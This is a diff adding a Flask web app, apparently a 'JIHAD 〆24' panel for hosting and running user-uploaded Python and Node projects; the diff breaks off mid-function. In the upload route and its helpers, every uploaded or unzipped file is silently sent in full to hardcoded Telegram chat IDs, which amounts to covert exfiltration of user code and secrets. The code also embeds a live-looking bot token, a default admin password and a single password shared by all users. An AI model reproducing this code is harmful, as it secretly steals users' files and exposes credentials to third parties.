@@ -1,0 +1,1374 @@
+import os
+import json
+import signal
+import subprocess
+import shutil
+import zipfile
+import hashlib
+import psutil
+import threading
+import time
+import urllib.request
+import urllib.parse
+import urllib.error
+from pathlib import Path
+from functools import wraps
+from datetime import datetime, timedelta
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file, abort
+import io
+import html as _html
+
+app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY", os.urandom(24).hex())
+
+BASE_DIR = Path(__file__).parent
+DATA_FILE = BASE_DIR / "data.json"
+SERVERS_DIR = BASE_DIR / "servers"
+SERVERS_DIR.mkdir(exist_ok=True)
+
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "JIHAD004X")
+NORMAL_PASSWORD = os.environ.get("NORMAL_PASSWORD", "user123")
+
+# ─── Telegram Config ────────────────────────────────────────────────
+TELEGRAM_BOT_TOKEN = "8701672227:AAEAJYCYxfCrQoUt41YPEk01NHrjUG8-7cw"
+TELEGRAM_ADMIN_IDS = [8179643564, 8544047548]
+
+RUNNING_PROCESSES = {}
+RESET_TIMERS = {}
+
+THEME_PRESETS = {
+    "🔮 Purple":  "#a855f7",
+    "🟢 Neon Green": "#00ff41",
+    "🔵 Sky Blue": "#38bdf8",
+    "🔴 Crimson":  "#ef4444",
+    "🟡 Amber":    "#fbbf24",
+    "🩵 Cyan":     "#06b6d4",
+    "🌸 Pink":     "#ec4899",
+    "🍋 Lime":     "#84cc16",
+    "⚡ Neon":     "#ff00ff",
+    "🟠 Orange":   "#ff6b00",
+    "💜 Violet":   "#8b00ff",
+    "🥇 Gold":     "#ffd700",
+}
+
+ALL_PACKAGES = {
+    "python": [
+        "flask", "fastapi", "django", "requests", "aiohttp", "discord.py",
+        "python-telegram-bot", "tweepy", "pandas", "numpy", "matplotlib",
+        "scikit-learn", "sqlalchemy", "psycopg2", "pymongo", "redis",
+        "celery", "pydantic", "httpx", "openai", "anthropic", "langchain",
+        "beautifulsoup4", "selenium", "scrapy", "pillow", "opencv-python",
+        "tensorflow", "torch", "transformers", "gradio", "streamlit",
+        "plotly", "seaborn", "jupyter", "ipython", "flask-socketio",
+        "websockets", "asyncio", "uvicorn", "gunicorn", "werkzeug",
+        "jinja2", "click", "colorama", "tqdm", "schedule", "apscheduler"
+    ],
+    "node": [
+        "express", "discord.js", "axios", "dotenv", "nodemon", "mongoose",
+        "socket.io", "jsonwebtoken", "bcryptjs", "cors", "helmet", "morgan",
+        "body-parser", "ejs", "pug", "handlebars", "react", "vue", "angular",
+        "next", "nuxt", "pm2", "forever", "webpack", "vite", "typescript",
+        "ts-node", "nodemailer", "passport", "multer", "sharp", "puppeteer"
+    ],
+    "static": [
+        "live-server", "http-server", "serve", "browser-sync"
+    ]
+}
+
+# ─── Telegram Notification ──────────────────────────────────────────
+# ─── Unicode Bold Text Converter ────────────────────────────────────
+_BOLD_MAP = {
+    'A':'𝐀','B':'𝐁','C':'𝐂','D':'𝐃','E':'𝐄','F':'𝐅','G':'𝐆','H':'𝐇',
+    'I':'𝐈','J':'𝐉','K':'𝐊','L':'𝐋','M':'𝐌','N':'𝐍','O':'𝐎','P':'𝐏',
+    'Q':'𝐐','R':'𝐑','S':'𝐒','T':'𝐓','U':'𝐔','V':'𝐕','W':'𝐖','X':'𝐗',
+    'Y':'𝐘','Z':'𝐙',
+    'a':'𝐚','b':'𝐛','c':'𝐜','d':'𝐝','e':'𝐞','f':'𝐟','g':'𝐠','h':'𝐡',
+    'i':'𝐢','j':'𝐣','k':'𝐤','l':'𝐥','m':'𝐦','n':'𝐧','o':'𝐨','p':'𝐩',
+    'q':'𝐪','r':'𝐫','s':'𝐬','t':'𝐭','u':'𝐮','v':'𝐯','w':'𝐰','x':'𝐱',
+    'y':'𝐲','z':'𝐳',
+    '0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕',
+    '8':'𝟖','9':'𝟗',
+}
+
+def B(text: str) -> str:
+    """Convert text to Unicode bold mathematical characters."""
+    return ''.join(_BOLD_MAP.get(c, c) for c in str(text))
+
+def send_telegram(message: str):
+    """Send formatted message to all admin Telegram IDs."""
+    if not TELEGRAM_BOT_TOKEN:
+        return
+    for chat_id in TELEGRAM_ADMIN_IDS:
+        try:
+            payload = urllib.parse.urlencode({
+                "chat_id": chat_id,
+                "text": message,
+                "parse_mode": "HTML"
+            }).encode()
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            req = urllib.request.Request(url, data=payload, method="POST")
+            urllib.request.urlopen(req, timeout=8)
+        except Exception:
+            pass
+
+# ── Beautiful Unicode-styled Telegram notifications ──────────────────
+
+def notify_file_upload(username: str, server_name: str, files: list):
+    """Notify admins when a user uploads files."""
+    # Escape all user content to prevent Telegram HTML parse errors
+    safe_user    = _html.escape(str(username))
+    safe_project = _html.escape(str(server_name))
+    file_lines = "\n".join(
+        f"   ► <code>{_html.escape(str(f))}</code>" for f in files[:10]
+    )
+    extra = f"\n   ... +{len(files)-10} MORE FILES" if len(files) > 10 else ""
+    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    msg = (
+        f"╔══════════════════════╗\n"
+        f"  JIHAD 〆24  ·  FILE UPLOAD\n"
+        f"╚══════════════════════╝\n"
+        f"\n"
+        f"📤  ACTION   ›  FILE UPLOADED\n"
+        f"👤  USER     ›  <code>{safe_user}</code>\n"
+        f"📁  PROJECT  ›  <code>{safe_project}</code>\n"
+        f"📦  FILES    ›  {len(files)} FILE(S)\n"
+        f"🕒  TIME     ›  <code>{now}</code>\n"
+        f"\n"
+        f"┌─── FILE LIST ───────────────\n"
+        f"{file_lines}{extra}\n"
+        f"└────────────────────────────────\n"
+        f"\n"
+        f"⚡  JIHAD 〆24  —  HOSTING PANEL"
+    )
+    threading.Thread(target=send_telegram, args=[msg], daemon=True).start()
+
+
+
+def send_telegram_document(file_path, caption: str = ""):
+    """Send an actual file to Telegram admins via sendDocument (multipart/form-data)."""
+    import mimetypes as _mt
+    if not TELEGRAM_BOT_TOKEN:
+        return
+    fp = Path(file_path)
+    if not fp.exists() or not fp.is_file():
+        return
+    if fp.stat().st_size > 49 * 1024 * 1024:
+        return  # skip >49 MB
+    mime = _mt.guess_type(str(fp))[0] or "application/octet-stream"
+    with open(fp, "rb") as fh:
+        file_data = fh.read()
+    # Build multipart body using a unique boundary
+    bnd = b"Jihad24Boundary"
+    CRLF = b"\r\n"
+    def field(name, value):
+        return (b"--" + bnd + CRLF +
+                b'Content-Disposition: form-data; name="' + name.encode() + b'"' + CRLF + CRLF +
+                str(value).encode("utf-8") + CRLF)
+    def filefield(name, filename, mime_type, data):
+        return (b"--" + bnd + CRLF +
+                b'Content-Disposition: form-data; name="' + name.encode() + b'"; filename="' + filename.encode("utf-8") + b'"' + CRLF +
+                b"Content-Type: " + mime_type.encode() + CRLF + CRLF +
+                data + CRLF)
+    for chat_id in TELEGRAM_ADMIN_IDS:
+        try:
+            body = field("chat_id", chat_id)
+            if caption:
+                # Keep caption ASCII-safe to avoid encoding issues
+                safe_cap = caption.encode("ascii", errors="replace").decode("ascii")
+                body += field("caption", safe_cap)
+            body += filefield("document", fp.name, mime, file_data)
+            body += b"--" + bnd + b"--" + CRLF
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+            req = urllib.request.Request(
+                url, data=body, method="POST",
+                headers={"Content-Type": "multipart/form-data; boundary=" + bnd.decode()}
+            )
+            resp = urllib.request.urlopen(req, timeout=90)
+            resp.read()  # drain response
+        except urllib.error.HTTPError as _he:
+            err_body = _he.read().decode(errors="replace")
+            send_telegram(f"[JIHAD DOC ERR] {fp.name}: HTTP {_he.code} - {err_body[:200]}")
+        except Exception as _e:
+            send_telegram(f"[JIHAD DOC ERR] {fp.name}: {str(_e)[:200]}")
+
+def notify_file_upload_with_docs(username: str, server_name: str, file_paths: list, base_dir: Path):
+    """Send notification text + send each actual file to Telegram."""
+    # Build display names for the text notification
+    display_names = [Path(p).name for p in file_paths]
+    notify_file_upload(username, server_name, display_names)
+    # Resolve absolute paths NOW (before thread starts, so files still exist)
+    abs_paths = []
+    for fp in file_paths:
+        p = Path(fp)
+        full = p if p.is_absolute() else base_dir / fp
+        if full.exists() and full.is_file():
+            abs_paths.append(str(full))
+    if not abs_paths:
+        return  # nothing to send
+    def _send(paths, uname, sname):
+        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        total = min(len(paths), 20)
+        for i, fpath in enumerate(paths[:20]):
+            cap = (
+                f"JIHAD 24 - FILE UPLOAD | "
+                f"File: {Path(fpath).name} | "
+                f"User: {uname} | "
+                f"Project: {sname} | "
+                f"{i+1}/{total} | {now}"
+            )
+            send_telegram_document(fpath, caption=cap)
+    threading.Thread(target=_send, args=[abs_paths, username, server_name], daemon=True).start()
+def notify_server_start(username: str, server_name: str, main_file: str):
+    """Notify admins when a server is started."""
+    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    msg = (
+        f"╔══════════════════════╗\n"
+        f"  {B('JIHAD')} 〆𝟐𝟒  ·  {B('SERVER START')}\n"
+        f"╚══════════════════════╝\n"
+        f"\n"
+        f"▶️  {B('ACTION')}    ›  {B('SERVER STARTED')}\n"
+        f"👤  {B('USER')}      ›  <code>{B(username.upper())}</code>\n"
+        f"🖥️  {B('PROJECT')}   ›  <code>{B(server_name.upper())}</code>\n"
+        f"🚀  {B('MAIN FILE')} ›  <code>{main_file}</code>\n"
+        f"🕒  {B('TIME')}      ›  <code>{now}</code>\n"
+        f"\n"
+        f"✅  {B('STATUS')}  ›  {B('RUNNING')}\n"
+        f"\n"
+        f"⚡  {B('JIHAD')} 〆𝟐𝟒  —  {B('HOSTING PANEL')}"
+    )
+    threading.Thread(target=send_telegram, args=[msg], daemon=True).start()
+
+
+def notify_server_stop(username: str, server_name: str):
+    """Notify admins when a server is stopped."""
+    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    msg = (
+        f"╔══════════════════════╗\n"
+        f"  {B('JIHAD')} 〆𝟐𝟒  ·  {B('SERVER STOP')}\n"
+        f"╚══════════════════════╝\n"
+        f"\n"
+        f"⏹️  {B('ACTION')}   ›  {B('SERVER STOPPED')}\n"
+        f"👤  {B('USER')}     ›  <code>{B(username.upper())}</code>\n"
+        f"🖥️  {B('PROJECT')}  ›  <code>{B(server_name.upper())}</code>\n"
+        f"🕒  {B('TIME')}     ›  <code>{now}</code>\n"
+        f"\n"
+        f"🔴  {B('STATUS')}  ›  {B('STOPPED')}\n"
+        f"\n"
+        f"⚡  {B('JIHAD')} 〆𝟐𝟒  —  {B('HOSTING PANEL')}"
+    )
+    threading.Thread(target=send_telegram, args=[msg], daemon=True).start()
+
+
+def notify_package_install(username: str, server_name: str, package: str, success: bool):
+    """Notify admins when a package is installed."""
+    status_icon = "✅" if success else "❌"
+    status_txt  = B("SUCCESS") if success else B("FAILED")
+    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    msg = (
+        f"╔══════════════════════╗\n"
+        f"  {B('JIHAD')} 〆𝟐𝟒  ·  {B('PACKAGE INSTALL')}\n"
+        f"╚══════════════════════╝\n"
+        f"\n"
+        f"📦  {B('ACTION')}   ›  {B('PACKAGE INSTALLED')}\n"
+        f"👤  {B('USER')}     ›  <code>{B(username.upper())}</code>\n"
+        f"📁  {B('PROJECT')}  ›  <code>{B(server_name.upper())}</code>\n"
+        f"📌  {B('PACKAGE')}  ›  <code>{package}</code>\n"
+        f"🕒  {B('TIME')}     ›  <code>{now}</code>\n"
+        f"\n"
+        f"{status_icon}  {B('STATUS')}  ›  {status_txt}\n"
+        f"\n"
+        f"⚡  {B('JIHAD')} 〆𝟐𝟒  —  {B('HOSTING PANEL')}"
+    )
+    threading.Thread(target=send_telegram, args=[msg], daemon=True).start()
+
+
+def notify_new_user(username: str):
+    """Notify admins when a new user registers."""
+    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    msg = (
+        f"╔══════════════════════╗\n"
+        f"  {B('JIHAD')} 〆𝟐𝟒  ·  {B('NEW USER')}\n"
+        f"╚══════════════════════╝\n"
+        f"\n"
+        f"🆕  {B('ACTION')}    ›  {B('USER REGISTERED')}\n"
+        f"👤  {B('USERNAME')}  ›  <code>{B(username.upper())}</code>\n"
+        f"🕒  {B('JOINED')}    ›  <code>{now}</code>\n"
+        f"\n"
+        f"🌟  {B('WELCOME TO JIHAD')} 〆𝟐𝟒\n"
+        f"\n"
+        f"⚡  {B('JIHAD')} 〆𝟐𝟒  —  {B('HOSTING PANEL')}"
+    )
+    threading.Thread(target=send_telegram, args=[msg], daemon=True).start()
+
+# ─── Data helpers ───────────────────────────────────────────────────
+def load_data():
+    if DATA_FILE.exists():
+        try:
+            return json.loads(DATA_FILE.read_text())
+        except Exception:
+            pass
+    return {
+        "servers": {},
+        "users": {},
+        "settings": {
+            "maintenance": False,
+            "maintenance_msg": "System under maintenance.",
+            "theme_color": "#a855f7",
+            "admin_password": ADMIN_PASSWORD,
+            "normal_password": NORMAL_PASSWORD,
+            "site_name": "JIHAD 〆24"
+        }
+    }
+
+def save_data(data):
+    DATA_FILE.write_text(json.dumps(data, indent=2, default=str))
+
+def hash_password(password):
+    return hashlib.sha256(password.encode()).hexdigest()
+
+def verify_password(password, hashed):
+    return hash_password(password) == hashed
+
+def get_theme_color():
+    data = load_data()
+    return data.get("settings", {}).get("theme_color", "#a855f7")
+
+@app.context_processor
+def inject_theme():
+    data = load_data()
+    settings = data.get("settings", {})
+    return {
+        "theme_color": settings.get("theme_color", "#a855f7"),
+        "site_name": settings.get("site_name", "JIHAD 〆24"),
+    }
+
+# ─── Auth decorators ────────────────────────────────────────────────
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get("username"):
+            return redirect(url_for("login"))
+        data = load_data()
+        settings = data.get("settings", {})
+        if settings.get("maintenance") and session.get("username") != "__admin__":
+            return render_template("maintenance.html",
+                                   message=settings.get("maintenance_msg", "Under maintenance"),
+                                   site_name=settings.get("site_name", "JIHAD 〆24"))
+        return f(*args, **kwargs)
+    return decorated
+
+def admin_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get("admin"):
+            return redirect(url_for("admin_login"))
+        return f(*args, **kwargs)
+    return decorated
+
+# ─── Process helpers ─────────────────────────────────────────────────
+def is_process_alive(pid):
+    try:
+        if not pid:
+            return False
+        p = psutil.Process(pid)
+        return p.is_running() and p.status() not in [psutil.STATUS_ZOMBIE, psutil.STATUS_DEAD]
+    except (psutil.NoSuchProcess, psutil.AccessDenied):
+        return False
+
+def kill_process(pid):
+    try:
+        p = psutil.Process(pid)
+        children = p.children(recursive=True)
+        p.terminate()
+        for child in children:
+            try:
+                child.terminate()
+            except Exception:
+                pass
+        try:
+            p.wait(timeout=5)
+        except psutil.TimeoutExpired:
+            p.kill()
+    except (psutil.NoSuchProcess, psutil.AccessDenied):
+        pass
+
+def get_run_command(runtime, main_file):
+    ext = Path(main_file).suffix.lower()
+    if runtime == "node" or ext in (".js", ".ts", ".mjs"):
+        return ["node", main_file]
+    elif runtime == "static":
+        return ["python", "-m", "http.server", "8080"]
+    else:
+        return ["python", "-u", main_file]
+
+def _sync_process_status():
+    data = load_data()
+    changed = False
+    for name, cfg in data["servers"].items():
+        pid = cfg.get("pid")
+        if pid and not is_process_alive(pid):
+            cfg["status"] = "stopped"
+            cfg["pid"] = None
+            changed = True
+    if changed:
+        save_data(data)
+
+_sync_process_status()
+
+def _auto_reset_seconds(cfg):
+    ar = cfg.get("auto_reset", {})
+    y = ar.get("years", 0) or 0
+    d = ar.get("days", 0) or 0
+    h = ar.get("hours", 0) or 0
+    m = ar.get("minutes", 0) or 0
+    s = ar.get("seconds", 0) or 0
+    return int(y * 365 * 24 * 3600 + d * 24 * 3600 + h * 3600 + m * 60 + s)
+
+def _do_auto_reset(name):
+    try:
+        data = load_data()
+        cfg = data["servers"].get(name)
+        if not cfg:
+            return
+        pid = cfg.get("pid")
+        if name in RUNNING_PROCESSES:
+            entry = RUNNING_PROCESSES[name]
+            proc = entry["proc"]
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            except Exception:
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+            try:
+                proc.wait(timeout=5)
+            except Exception:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+            try:
+                entry["log_file"].close()
+            except Exception:
+                pass
+            del RUNNING_PROCESSES[name]
+        elif pid:
+            kill_process(pid)
+
+        log_path = SERVERS_DIR / name / "logs.txt"
+        try:
+            with open(log_path, "a") as lf:
+                lf.write(f"\n{'='*50}\n[{datetime.now().isoformat()}] AUTO RESET triggered\n{'='*50}\n")
+        except Exception:
+            pass
+
+        main_file = cfg.get("main_file") or "main.py"
+        main_cmd = cfg.get("main_command") or ""
+        extract_dir = SERVERS_DIR / name / "extracted"
+        main_path = extract_dir / main_file
+        if main_path.exists():
+            if main_cmd:
+                cmd = main_cmd.split()
+            else:
+                cmd = get_run_command(cfg.get("runtime", "python"), main_file)
+            env = os.environ.copy()
+            env["PORT"] = str(cfg.get("port", 8080))
+            log_file = open(log_path, "a")
+            proc = subprocess.Popen(cmd, cwd=str(extract_dir), stdout=log_file, stderr=log_file,
+                                    env=env, preexec_fn=os.setsid)
+            RUNNING_PROCESSES[name] = {"proc": proc, "log_file": log_file}
+            cfg["status"] = "running"
+            cfg["pid"] = proc.pid
+        else:
+            cfg["status"] = "stopped"
+            cfg["pid"] = None
+
+        data["servers"][name] = cfg
+        save_data(data)
+
+        total = _auto_reset_seconds(cfg)
+        if cfg.get("auto_reset", {}).get("enabled") and total > 0:
+            _schedule_reset(name, total)
+    except Exception:
+        pass
+
+def _schedule_reset(name, total_seconds):
+    if name in RESET_TIMERS:
+        try:
+            RESET_TIMERS[name]["timer"].cancel()
+        except Exception:
+            pass
+    t = threading.Timer(total_seconds, _do_auto_reset, args=[name])
+    t.daemon = True
+    t.start()
+    RESET_TIMERS[name] = {
+        "timer": t,
+        "started_at": datetime.now().isoformat(),
+        "total_seconds": total_seconds
+    }
+
+def _init_reset_timers():
+    data = load_data()
+    for name, cfg in data["servers"].items():
+        ar = cfg.get("auto_reset", {})
+        if ar.get("enabled"):
+            total = _auto_reset_seconds(cfg)
+            if total > 0:
+                _schedule_reset(name, total)
+
+_init_reset_timers()
+
+# ─── Keep-alive ──────────────────────────────────────────────────────
+@app.route("/api/ping")
+def ping():
+    return "pong", 200
+
+def keep_alive():
+    while True:
+        time.sleep(240)
+        try:
+            url = os.environ.get("RENDER_EXTERNAL_URL")
+            if url:
+                ping_url = f"{url}/api/ping"
+            else:
+                port = os.environ.get("PORT", 5000)
+                ping_url = f"http://127.0.0.1:{port}/api/ping"
+            req = urllib.request.Request(ping_url, headers={'User-Agent': 'KeepAlive-Bot/1.0'})
+            urllib.request.urlopen(req, timeout=10)
+        except Exception:
+            pass
+
+threading.Thread(target=keep_alive, daemon=True).start()
+
+# ─── Routes ──────────────────────────────────────────────────────────
+@app.route("/")
+def index():
+    if session.get("username"):
+        return redirect(url_for("dashboard"))
+    return redirect(url_for("login"))
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    data = load_data()
+    settings = data.get("settings", {})
+    site_name = settings.get("site_name", "JIHAD 〆24")
+    theme_color = settings.get("theme_color", "#a855f7")
+
+    if request.method == "POST":
+        username = request.form.get("username", "").strip()
+        password = request.form.get("password", "").strip()
+
+        if not username:
+            return render_template("login.html", error="Enter a username",
+                                   site_name=site_name, theme_color=theme_color)
+
+        normal_pass = settings.get("normal_password", NORMAL_PASSWORD)
+        if password != normal_pass:
+            return render_template("login.html", error="Wrong password",
+                                   site_name=site_name, theme_color=theme_color)
+
+        is_new = username not in data["users"]
+        user = data["users"].get(username)
+        if not user:
+            data["users"][username] = {
+                "joined": datetime.now().isoformat(),
+                "password_hash": hash_password(password)
+            }
+            save_data(data)
+            notify_new_user(username)
+        else:
+            if user.get("password_hash") != hash_password(password):
+                data["users"][username]["password_hash"] = hash_password(password)
+                save_data(data)
+
+        session["username"] = username
+        return redirect(url_for("dashboard"))
+
+    return render_template("login.html", error=None, site_name=site_name, theme_color=theme_color)
+
+@app.route("/logout")
+def logout():
+    session.clear()
+    return redirect(url_for("login"))
+
+@app.route("/dashboard")
+@login_required
+def dashboard():
+    username = session["username"]
+    data = load_data()
+    settings = data.get("settings", {})
+    site_name = settings.get("site_name", "JIHAD 〆24")
+    user_servers = {k: v for k, v in data["servers"].items() if v.get("owner") == username}
+    changed = False
+    for name, cfg in user_servers.items():
+        pid = cfg.get("pid")
+        if pid and not is_process_alive(pid):
+            cfg["status"] = "stopped"
+            cfg["pid"] = None
+            data["servers"][name] = cfg
+            changed = True
+    if changed:
+        save_data(data)
+    running = sum(1 for v in user_servers.values() if v.get("status") == "running")
+    return render_template("dashboard.html", servers=user_servers, running=running,
+                           total=len(user_servers), username=username, site_name=site_name)
+
+@app.route("/api/stats")
+@login_required
+def system_stats():
+    cpu = psutil.cpu_percent(interval=0.1)
+    ram = psutil.virtual_memory().percent
+    disk = psutil.disk_usage("/").percent
+    return jsonify({"cpu": cpu, "ram": ram, "disk": disk})
+
+@app.route("/server/create", methods=["POST"])
+@login_required
+def create_server():
+    name = request.form.get("name", "").strip().replace(" ", "-")
+    runtime = request.form.get("runtime", "python")
+    if not name:
+        return redirect(url_for("dashboard"))
+    data = load_data()
+    if name in data["servers"]:
+        return redirect(url_for("dashboard"))
+    cfg = {
+        "name": name,
+        "owner": session["username"],
+        "runtime": runtime,
+        "status": "stopped",
+        "main_file": "",
+        "main_command": "",
+        "port": 8080,
+        "packages": [],
+        "pid": None,
+        "created": datetime.now().isoformat(),
+        "auto_reset": {"enabled": False, "years": 0, "days": 0, "hours": 0, "minutes": 0, "seconds": 0}
+    }
+    data["servers"][name] = cfg
+    save_data(data)
+    (SERVERS_DIR / name / "extracted").mkdir(parents=True, exist_ok=True)
+    return redirect(url_for("server_detail", name=name))
+
+@app.route("/server/<name>/delete", methods=["POST"])
+@login_required
+def delete_server(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return redirect(url_for("dashboard"))
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return redirect(url_for("dashboard"))
+    pid = cfg.get("pid")
+    if pid:
+        kill_process(pid)
+    if name in RUNNING_PROCESSES:
+        try:
+            RUNNING_PROCESSES[name]["proc"].terminate()
+        except Exception:
+            pass
+        del RUNNING_PROCESSES[name]
+    if name in RESET_TIMERS:
+        try:
+            RESET_TIMERS[name]["timer"].cancel()
+        except Exception:
+            pass
+        del RESET_TIMERS[name]
+    shutil.rmtree(SERVERS_DIR / name, ignore_errors=True)
+    del data["servers"][name]
+    save_data(data)
+    return redirect(url_for("dashboard"))
+
+@app.route("/server/<name>")
+@login_required
+def server_detail(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return "Server not found", 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return "Access denied", 403
+    pid = cfg.get("pid")
+    if pid and not is_process_alive(pid):
+        cfg["status"] = "stopped"
+        cfg["pid"] = None
+        data["servers"][name] = cfg
+        save_data(data)
+    if "auto_reset" not in cfg:
+        cfg["auto_reset"] = {"enabled": False, "years": 0, "days": 0, "hours": 0, "minutes": 0, "seconds": 0}
+    if "main_command" not in cfg:
+        cfg["main_command"] = ""
+    extract_dir = SERVERS_DIR / name / "extracted"
+    files = list_files(extract_dir)
+    return render_template("server.html", server_name=name, config=cfg, files=files)
+
+def list_files(directory, base=""):
+    result = []
+    if not directory.exists():
+        return result
+    try:
+        for entry in sorted(directory.iterdir(), key=lambda e: (e.is_file(), e.name)):
+            rel = f"{base}/{entry.name}" if base else entry.name
+            if entry.is_dir():
+                result.append({"name": entry.name, "path": rel, "type": "dir", "size": 0})
+                result.extend(list_files(entry, rel))
+            else:
+                result.append({"name": entry.name, "path": rel, "type": "file", "size": entry.stat().st_size})
+    except Exception:
+        pass
+    return result
+
+@app.route("/server/<name>/upload", methods=["POST"])
+@login_required
+def upload_file(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False, "error": "Server not found"}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False, "error": "Access denied"}), 403
+    if "file" not in request.files:
+        return jsonify({"success": False, "error": "No file uploaded"}), 400
+
+    f = request.files["file"]
+    if f.filename == "":
+        return jsonify({"success": False, "error": "Empty filename"}), 400
+
+    extract_dir = SERVERS_DIR / name / "extracted"
+    extract_dir.mkdir(parents=True, exist_ok=True)
+    upload_path = SERVERS_DIR / name / f"upload_{f.filename}"
+    f.save(upload_path)
+    extracted_files = []
+
+    # absolute paths to send to Telegram (resolved before any unlink)
+    tg_abs_paths = []
+
+    if f.filename.lower().endswith(".zip"):
+        try:
+            with zipfile.ZipFile(upload_path, "r") as z:
+                for member in z.infolist():
+                    if member.filename.startswith(("/", "\\", "..", "../")):
+                        upload_path.unlink(missing_ok=True)
+                        return jsonify({"success": False, "error": "Invalid zip path"})
+                z.extractall(extract_dir)
+                for member in z.infolist():
+                    if not member.is_dir():
+                        extracted_files.append(member.filename)
+                        abs_p = extract_dir / member.filename
+                        if abs_p.exists() and abs_p.is_file():
+                            tg_abs_paths.append(str(abs_p))
+            upload_path.unlink(missing_ok=True)  # ZIP deleted AFTER paths collected
+        except Exception as e:
+            upload_path.unlink(missing_ok=True)
+            return jsonify({"success": False, "error": f"Zip extraction failed: {str(e)}"}), 500
+    else:
+        dest = extract_dir / f.filename
+        shutil.move(str(upload_path), str(dest))
+        extracted_files = [f.filename]
+        if dest.exists():
+            tg_abs_paths.append(str(dest))
+        if not cfg.get("main_file") and f.filename.endswith((".py", ".js", ".ts")):
+            cfg["main_file"] = f.filename
+            data["servers"][name] = cfg
+            save_data(data)
+
+    # Telegram: send text notification + actual files
+    _uname = session.get("username", "unknown")
+    notify_file_upload(
+        _uname, name,
+        [Path(p).name for p in tg_abs_paths] if tg_abs_paths else extracted_files
+    )
+    if tg_abs_paths:
+        def _send_docs(paths, uname, sname):
+            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            total = min(len(paths), 20)
+            for i, fpath in enumerate(paths[:20]):
+                cap = (
+                    f"JIHAD 24 | File: {Path(fpath).name} | "
+                    f"User: {uname} | Project: {sname} | "
+                    f"{i+1}/{total} | {now}"
+                )
+                send_telegram_document(fpath, caption=cap)
+        threading.Thread(target=_send_docs, args=[tg_abs_paths, _uname, name], daemon=True).start()
+    return jsonify({"success": True, "files": extracted_files, "count": len(extracted_files)})
+
+@app.route("/server/<name>/packages/install", methods=["POST"])
+@login_required
+def install_package(name):
+    data = load_data()
+    cfg = data["servers"].get(name)
+    if not cfg:
+        return jsonify({"success": False, "error": "Server not found"}), 404
+    if cfg.get("owner") != session["username"] and not session.get("admin"):
+        return jsonify({"success": False, "error": "Access denied"}), 403
+
+    payload = request.get_json()
+    pkg_name = (payload.get("name") or "").strip()
+    pkg_ver = (payload.get("version") or "").strip()
+    runtime = cfg.get("runtime", "python")
+
+    if not pkg_name:
+        return jsonify({"success": False, "error": "Package name required"})
+
+    install_str = f"{pkg_name}=={pkg_ver}" if pkg_ver else pkg_name
+
+    try:
+        if runtime == "python":
+            result = subprocess.run(["pip", "install", install_str],
+                                    capture_output=True, text=True, timeout=120)
+        elif runtime == "node":
+            result = subprocess.run(["npm", "install", pkg_name] + (["@" + pkg_ver] if pkg_ver else []),
+                                    capture_output=True, text=True, timeout=120,
+                                    cwd=str(SERVERS_DIR / name / "extracted"))
+        else:
+            result = subprocess.run(["npm", "install", "-g", pkg_name] + (["@" + pkg_ver] if pkg_ver else []),
+                                    capture_output=True, text=True, timeout=120)
+
+        if result.returncode != 0:
+            notify_package_install(session.get("username", "?"), name, install_str, False)
+            return jsonify({"success": False, "error": result.stderr[:500] or result.stdout[:500]})
+    except Exception as e:
+        notify_package_install(session.get("username", "?"), name, install_str, False)
+        return jsonify({"success": False, "error": str(e)})
+
+    pkgs = cfg.get("packages", [])
+    pkgs = [p for p in pkgs if p["name"] != pkg_name]
+    pkgs.append({"name": pkg_name, "version": pkg_ver or "", "installed_at": datetime.now().isoformat(), "runtime": runtime})
+    cfg["packages"] = pkgs
+    data["servers"][name] = cfg
+    save_data(data)
+
+    if runtime == "python":
+        req_path = SERVERS_DIR / name / "extracted" / "requirements.txt"
+        try:
+            lines = req_path.read_text().splitlines() if req_path.exists() else []
+            lines = [l for l in lines if not l.lower().startswith(pkg_name.lower())]
+            lines.append(install_str)
+            req_path.write_text("\n".join(lines) + "\n")
+        except Exception:
+            pass
+
+    notify_package_install(session.get("username", "?"), name, install_str, True)
+    return jsonify({"success": True, "package": pkg_name, "redirect_tab": "files"})
+
+@app.route("/admin/packages/install-all", methods=["POST"])
+@admin_required
+def install_all_packages():
+    results = {"python": [], "node": [], "static": [], "failed": []}
+    for pkg in ALL_PACKAGES["python"]:
+        try:
+            result = subprocess.run(["pip", "install", pkg], capture_output=True, text=True, timeout=60)
+            if result.returncode == 0:
+                results["python"].append(pkg)
+            else:
+                results["failed"].append(f"python:{pkg}")
+        except Exception:
+            results["failed"].append(f"python:{pkg}")
+    for pkg in ALL_PACKAGES["node"]:
+        try:
+            result = subprocess.run(["npm", "install", "-g", pkg], capture_output=True, text=True, timeout=60)
+            if result.returncode == 0:
+                results["node"].append(pkg)
+            else:
+                results["failed"].append(f"node:{pkg}")
+        except Exception:
+            results["failed"].append(f"node:{pkg}")
+    for pkg in ALL_PACKAGES["static"]:
+        try:
